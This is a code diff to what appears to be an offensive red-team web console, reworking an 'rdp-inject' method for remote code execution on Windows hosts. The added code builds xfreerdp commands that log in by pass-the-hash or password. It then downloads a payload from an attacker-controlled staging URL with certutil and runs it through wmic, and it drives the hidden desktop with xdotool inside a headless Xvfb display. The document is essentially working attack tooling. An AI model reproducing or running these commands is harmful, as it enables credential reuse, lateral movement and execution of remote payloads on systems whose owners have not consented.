@@ -1971,7 +1971,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <optgroup label="── RDP LOLBin (requires Staging URL)">
                 <option value="rdp-certutil">xfreerdp + certutil download + exec</option>
                 <option value="rdp-iex">xfreerdp + PowerShell IEX</option>
-                <option value="rdp-inject">xfreerdp + xdotool inject (Win+R)</option>
+                <option value="rdp-inject">xfreerdp + xdotool inject (PTH:/shell: | pwd:Ctrl+Esc→Run)</option>
               </optgroup>
             </select>
             <button class="btn btn-ghost btn-sm" id="ipc-btn-upload" onclick="ipcRun('upload')">⬆ Upload</button>
@@ -17176,8 +17176,8 @@ async function ipcRun(action) {
 
   // RDP methods — /shell: sets alternate shell at RDP login (no RemoteApp needed).
   if (isRDP) {
-    const ntHash   = a.hash.replace(/^:/, '') || a.hash;
-    const usePTH   = method === 'rdp-drive-pth' && ntHash;
+    const ntHash   = a.hash.includes(':') ? a.hash.split(':').pop() : a.hash;
+    const usePTH   = ntHash && (method === 'rdp-drive-pth' || method === 'rdp-inject');
     const rdpCreds = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:'${a.pass}'`;
     const rdpDom   = a.domain ? ` /d:'${a.domain}'` : '';
     const rdpBase  = `DISPLAY=\${DISPLAY:-:1} XAUTHORITY=\${XAUTHORITY:-\$HOME/.Xauthority} xfreerdp /v:${a.target}${rdpDom} /u:'${a.user}' ${rdpCreds} /cert:ignore`;
@@ -17213,51 +17213,89 @@ async function ipcRun(action) {
         ` ${rdpTail}`
       );
     } else if (method === 'rdp-inject') {
-      // GUI injection via xdotool Win+R — runs in a headless Xvfb virtual display
-      // so the RDP window never appears on the operator's real screen.
-      // fluxbox provides a WM so xdotool windowfocus works (without WM, XSetInputFocus
-      // is ignored and keystrokes never reach xfreerdp).
+      // PTH (Restricted Admin): Windows honors /shell: → certutil+exec via AlternateShell.
+      // Password auth: /shell: ignored → full desktop renders; xdotool types into Run dialog.
+      //   Ctrl+Escape opens Start without going through Super key (fluxbox intercepts Super).
       if (!surl) { toast('Enter Staging URL', 'error'); return; }
-      // Use forward slashes in the path so xdotool never has to type '\' —
-      // Windows cmd.exe and certutil both accept '/' as a path separator.
-      const rpFwd  = rpath.replace(/\\/g, '/');
-      const winCmd = `cmd /c certutil -urlcache -split -f ${surl} ${rpFwd} && ${rpFwd}`;
+      const rpFwd   = rpath.replace(/\\/g, '/');
+      // Use C:\Users\Public\ (world-writable) so non-admin RDP users can write the file.
+      // _x suffix avoids file-lock if the same binary is already running under its original name.
+      const fname   = rpFwd.replace(/.*\//, '');
+      const rpInj   = 'C:/Users/Public/' + fname.replace(/(\.[^.\/\\]+)$/, '_x$1');
+      // wmic treats '/' as flag prefix — must use backslashes for the executable path.
+      const rpInjBs = rpInj.replace(/\//g, '\\');
+      const winCmd  = `cmd.exe /c certutil -urlcache -split -f ${surl} ${rpInj} && wmic process call create ${rpInjBs}`;
       const uDQ = (a.user   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const pDQ = (a.pass   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const dDQ = (a.domain ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
-      const rdpDomDQ   = dDQ ? ` /d:"${dDQ}"` : '';
-      const rdpCredsDQ = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:"${pDQ}"`;
-      const xfreeCmd   = `xfreerdp /v:${a.target}${rdpDomDQ} /u:"${uDQ}" ${rdpCredsDQ} /cert:ignore /w:1280 /h:1024 /log-level:OFF`;
-      const steps = [
-        `command -v Xvfb >/dev/null 2>&1 || apt-get install -y xvfb -qq`,
-        `command -v xdotool >/dev/null 2>&1 || apt-get install -y xdotool -qq`,
-        `VDISP=:$(( $$ % 400 + 200 ))`,
-        `Xvfb "$VDISP" -screen 0 1280x1024x24 & XVFB_PID=$!`,
-        `sleep 2`,
-        `DISPLAY="$VDISP" XAUTHORITY="" ${xfreeCmd} & XPID=$!`,
-        `sleep 15`,
-        `WID=$(DISPLAY="$VDISP" xdotool search --pid $XPID 2>/dev/null | tail -1)`,
-        `[ -z "$WID" ] && WID=$(DISPLAY="$VDISP" xdotool search --class xfreerdp 2>/dev/null | tail -1)`,
-        `echo "[*] RDP window=$WID pid=$XPID vdisp=$VDISP"`,
-        `export DISPLAY="$VDISP"`,
-        `xdotool windowraise "$WID"`,
-        `xdotool mousemove --window "$WID" 640 512`,
-        `sleep 0.3`,
-        `xdotool click 1`,
-        `sleep 0.5`,
-        `xdotool key Escape`,
-        `sleep 0.5`,
-        `xdotool key super+r`,
-        `sleep 2`,
-        `xdotool type --clearmodifiers --delay 50 "${winCmd}"`,
-        `sleep 0.5`,
-        `xdotool key Return`,
-        `sleep 25`,
-        `kill $XPID 2>/dev/null`,
-        `kill $XVFB_PID 2>/dev/null`,
-        `echo "[+] rdp-inject done"`,
-      ];
-      cmds.push(`bash -c '${steps.join('; ')}'`);
+      // For PTH, use short domain so Kerberos fails at KDC-not-found → clean NTLM fallback.
+      const rdpDomStr  = usePTH && dDQ ? dDQ.split('.')[0] : dDQ;
+      const rdpDomDQ   = rdpDomStr ? ` /d:"${rdpDomStr}"` : '';
+      if (usePTH) {
+        // PTH: Restricted Admin honors /shell:; +disable-output safe (minimal session).
+        const xfreeCmd = `xfreerdp /v:${a.target}${rdpDomDQ} /u:"${uDQ}" /pth:${ntHash} /restricted-admin /cert:ignore /w:800 /h:600 +disable-output /shell:"${winCmd}" /log-level:WARN`;
+        const steps = [
+          `command -v Xvfb >/dev/null 2>&1 || apt-get install -y xvfb -qq`,
+          `VDISP=:$(( $$ % 400 + 200 ))`,
+          `Xvfb "$VDISP" -screen 0 800x600x24 & XVFB_PID=$!`,
+          `sleep 1`,
+          `KRB5_CONFIG=/home/kali/.krb5.conf DISPLAY="$VDISP" XAUTHORITY="" ${xfreeCmd}`,
+          `kill $XVFB_PID 2>/dev/null`,
+          `echo "[+] rdp-inject done"`,
+        ];
+        cmds.push(`bash -c '${steps.join('; ')}'`);
+      } else {
+        // Password: full desktop; Ctrl+Shift+Esc → Task Manager → File → Run new task.
+        // Avoids Win/Super key which Xvfb doesn't map, so super+r is silently dropped by xfreerdp.
+        const xfreeCmd = `xfreerdp /v:${a.target}${rdpDomDQ} /u:"${uDQ}" /p:"${pDQ}" /cert:ignore /w:1024 /h:768 /log-level:WARN`;
+        const scr = `python3 /tmp/xwd2png.py`;
+        const steps = [
+          `command -v Xvfb >/dev/null 2>&1 || apt-get install -y xvfb -qq`,
+          `command -v xdotool >/dev/null 2>&1 || apt-get install -y xdotool -qq`,
+          `VDISP=:$(( $$ % 400 + 200 ))`,
+          `SCRDIR=/tmp/rdp_dbg_$$`,
+          `mkdir -p "$SCRDIR"`,
+          `Xvfb "$VDISP" -screen 0 1024x768x24 & XVFB_PID=$!`,
+          `sleep 1`,
+          `KRB5_CONFIG=/home/kali/.krb5.conf DISPLAY="$VDISP" XAUTHORITY="" ${xfreeCmd} & RDP_PID=$!`,
+          `echo "[*] Waiting for Windows desktop..."`,
+          `sleep 25`,
+          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/01_desktop.xwd" 2>/dev/null && ${scr} "$SCRDIR/01_desktop.xwd" "$SCRDIR/01_desktop.png" && echo "[*] Screenshot 01_desktop saved"`,
+          `WIN=$(DISPLAY="$VDISP" xdotool search --pid $RDP_PID 2>/dev/null | head -1)`,
+          `[ -z "$WIN" ] && echo "[!] No window found" && kill $RDP_PID $XVFB_PID 2>/dev/null && exit 1`,
+          `echo "[*] Window: $WIN"`,
+          // Click center of screen via XTEST (ButtonPress → xfreerdp sends RDP mouse event →
+          // Windows sets keyboard focus to whatever is under cursor, establishing input focus).
+          `echo "[*] Clicking desktop to establish RDP input focus..."`,
+          `DISPLAY="$VDISP" xdotool mousemove --sync 512 400`,
+          `sleep 0.2`,
+          `DISPLAY="$VDISP" xdotool click 1`,
+          `sleep 0.5`,
+          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/01b_after_click.xwd" 2>/dev/null && ${scr} "$SCRDIR/01b_after_click.xwd" "$SCRDIR/01b_after_click.png" && echo "[*] Screenshot 01b_after_click saved"`,
+          // Right-click Start button → Win+X quick-access menu → 'r' opens Run dialog.
+          // Avoids Win/Super key (no xkb scancode in Xvfb) and Task Manager compact-mode menu issues.
+          `echo "[*] Right-clicking Start button for Win+X menu..."`,
+          `DISPLAY="$VDISP" xdotool mousemove --sync 12 748`,
+          `sleep 0.2`,
+          `DISPLAY="$VDISP" xdotool click 3`,
+          `sleep 1.5`,
+          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/02_winx_menu.xwd" 2>/dev/null && ${scr} "$SCRDIR/02_winx_menu.xwd" "$SCRDIR/02_winx_menu.png" && echo "[*] Screenshot 02_winx_menu saved"`,
+          `echo "[*] Pressing r for Run..."`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers r`,
+          `sleep 1.5`,
+          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/03_run_dialog.xwd" 2>/dev/null && ${scr} "$SCRDIR/03_run_dialog.xwd" "$SCRDIR/03_run_dialog.png" && echo "[*] Screenshot 03_run_dialog saved"`,
+          `echo "[*] Typing command..."`,
+          `DISPLAY="$VDISP" xdotool type --clearmodifiers --delay 50 "${winCmd}"`,
+          `sleep 0.5`,
+          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/04_cmd_typed.xwd" 2>/dev/null && ${scr} "$SCRDIR/04_cmd_typed.xwd" "$SCRDIR/04_cmd_typed.png" && echo "[*] Screenshot 04_cmd_typed saved"`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers Return`,
+          `echo "[*] Screenshots in: $SCRDIR"`,
+          `sleep 45`,
+          `kill $RDP_PID $XVFB_PID 2>/dev/null`,
+          `echo "[+] rdp-inject done"`,
+        ];
+        cmds.push(`bash -c '${steps.join('; ')}'`);
+      }
     }
   }
 
